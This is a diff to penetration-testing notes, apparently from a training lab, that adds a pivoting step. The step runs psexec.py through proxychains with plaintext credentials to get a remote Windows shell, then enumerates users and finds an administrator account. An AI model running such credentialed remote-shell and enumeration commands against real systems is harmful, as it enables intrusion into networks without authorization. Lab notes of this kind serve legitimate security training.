@@ -780,7 +780,39 @@ OS Version:                6.3.9600 N/A Build 9600
 System Type:               x64-based PC
 
 ````
+### Pivoting
+#### psexec.py
+````
+proxychains psexec.py alice:aliceishere@10.11.1.50 cmd.exe
+````
+````
+C:\HFS>whoami
+whoami
+bethany\bethany
+````
+````
+C:\Users\Bethany\Desktop>net user Bethany
+Local Group Memberships      *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+````
+````
+C:\Users\Bethany\Desktop>net users
+net users
 
+User accounts for \\BETHANY
+
+-------------------------------------------------------------------------------
+Administrator            alice                    Bethany                  
+Guest                    
+The command completed successfully
+````
+````
+C:\Users\Bethany\Desktop>net user alice
+Local Group Memberships      *Administrators       
+Global Group memberships     *None                 
+The command completed successfully.
+````
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
